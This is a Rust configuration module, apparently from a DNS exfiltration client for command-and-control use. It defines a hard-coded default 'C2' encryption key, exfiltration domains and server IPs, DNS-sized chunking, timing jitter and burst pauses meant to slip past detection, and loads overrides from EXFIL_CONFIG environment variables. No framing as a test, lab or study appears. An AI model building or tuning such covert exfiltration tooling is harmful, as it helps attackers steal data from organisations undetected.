use once_cell::sync::{Lazy, OnceCell};
use serde::Deserialize;
use std::{env, fs};

use crate::limits::max_supported_chunk_bytes;

#[derive(Clone)]
pub struct Config {
    pub encryption_key: String,
    pub domains: Vec<String>,
    pub resolvers: Vec<String>,
    pub server_ips: Vec<String>,
    pub chunk_bytes: usize,
    pub jitter_min_ms: u64,
    pub jitter_max_ms: u64,
    pub chunks_per_burst: usize,
    pub burst_pause_ms: u64,
    pub chunk_retry_attempts: usize,
    pub chunk_retry_delay_ms: u64,
    pub use_txt_records: bool,
}

#[derive(Debug, Deserialize)]
struct FileConfig {
    encryption_key: String,
    domains: Vec<String>,
    #[serde(default)]
    resolvers: Vec<String>,
    server_ip: Option<String>,
    #[serde(default)]
    server_ips: Vec<String>,
    chunk_bytes: usize,
    jitter_min_ms: u64,
    jitter_max_ms: u64,
    chunks_per_burst: usize,
    burst_pause_ms: u64,
    #[serde(default = "default_chunk_retry_attempts")]
    chunk_retry_attempts: usize,
    #[serde(default = "default_chunk_retry_delay_ms")]
    chunk_retry_delay_ms: u64,
    #[serde(default)]
    use_txt_records: bool,
}

static EMBEDDED: Lazy<Config> = Lazy::new(|| Config {
    encryption_key: "MySecretC2Key123!@#DefaultChange".to_string(),
    domains: vec!["example.com".to_string()],
    resolvers: vec![],
    server_ips: vec!["0.0.0.0".to_string()],
    chunk_bytes: 180,
    jitter_min_ms: 1500,
    jitter_max_ms: 4000,
    chunks_per_burst: 5,
    burst_pause_ms: 12000,
    chunk_retry_attempts: default_chunk_retry_attempts(),
    chunk_retry_delay_ms: default_chunk_retry_delay_ms(),
    use_txt_records: false, // Default to A records
});

static RUNTIME: OnceCell<Config> = OnceCell::new();
static ADJUSTMENT: OnceCell<Option<(usize, usize)>> = OnceCell::new();

impl Config {
    pub fn load() -> Self {
        if let Some(cfg) = RUNTIME.get() {
            return cfg.clone();
        }

        let base = load_runtime_config().unwrap_or_else(|| EMBEDDED.clone());
        let tuned = tune_chunk_bytes(base);
        Config::store(tuned)
    }

    fn store(cfg: Config) -> Config {
        let _ = RUNTIME.set(cfg.clone());
        cfg
    }

    pub fn dns_domains(&self) -> &[String] {
        &self.domains
    }

    pub fn resolver_endpoints(&self) -> &[String] {
        &self.resolvers
    }

    pub fn server_ips(&self) -> &[String] {
        &self.server_ips
    }

    pub fn chunk_adjustment() -> Option<(usize, usize)> {
        ADJUSTMENT.get().cloned().unwrap_or(None)
    }

    pub fn from_file(path: &str) -> Result<Self, String> {
        let data =
            fs::read_to_string(path).map_err(|e| format!("failed to read config {path}: {e}"))?;
        Self::from_json(&data)
    }

    pub fn from_json(json: &str) -> Result<Self, String> {
        let parsed: FileConfig =
            serde_json::from_str(json).map_err(|e| format!("invalid config json: {e}"))?;
        Ok(parsed.into())
    }
}

fn load_runtime_config() -> Option<Config> {
    if let Ok(path) = env::var("EXFIL_CONFIG_PATH") {
        match Config::from_file(&path) {
            Ok(cfg) => return Some(cfg),
            Err(err) => eprintln!("[exfil-client] {err}"),
        }
    }

    if let Ok(json) = env::var("EXFIL_CONFIG_JSON") {
        match Config::from_json(&json) {
            Ok(cfg) => return Some(cfg),
            Err(err) => eprintln!("[exfil-client] {err}"),
        }
    }

    None
}

fn tune_chunk_bytes(mut cfg: Config) -> Config {
    let max_allowed = max_supported_chunk_bytes(&cfg.domains);
    let original = cfg.chunk_bytes;

    if max_allowed == 0 {
        let _ = ADJUSTMENT.set(None);
        return cfg;
    }

    if cfg.chunk_bytes == 0 || cfg.chunk_bytes > max_allowed {
        cfg.chunk_bytes = max_allowed;
    }

    let adjustment = if original != cfg.chunk_bytes {
        Some((original, cfg.chunk_bytes))
    } else {
        None
    };

    let _ = ADJUSTMENT.set(adjustment);
    cfg
}

impl From<FileConfig> for Config {
    fn from(value: FileConfig) -> Self {
        let mut ips = value.server_ips;
        if let Some(ip) = value.server_ip {
            if !ips.contains(&ip) {
                ips.push(ip);
            }
        }
        if ips.is_empty() {
            ips.push("0.0.0.0".to_string());
        }

        Config {
            encryption_key: value.encryption_key,
            domains: value.domains,
            resolvers: value.resolvers,
            server_ips: ips,
            chunk_bytes: value.chunk_bytes,
            jitter_min_ms: value.jitter_min_ms,
            jitter_max_ms: value.jitter_max_ms,
            chunks_per_burst: value.chunks_per_burst,
            burst_pause_ms: value.burst_pause_ms,
            chunk_retry_attempts: value.chunk_retry_attempts,
            chunk_retry_delay_ms: value.chunk_retry_delay_ms,
            use_txt_records: value.use_txt_records,
        }
    }
}

const fn default_chunk_retry_attempts() -> usize {
    3
}

const fn default_chunk_retry_delay_ms() -> u64 {
    2000
}
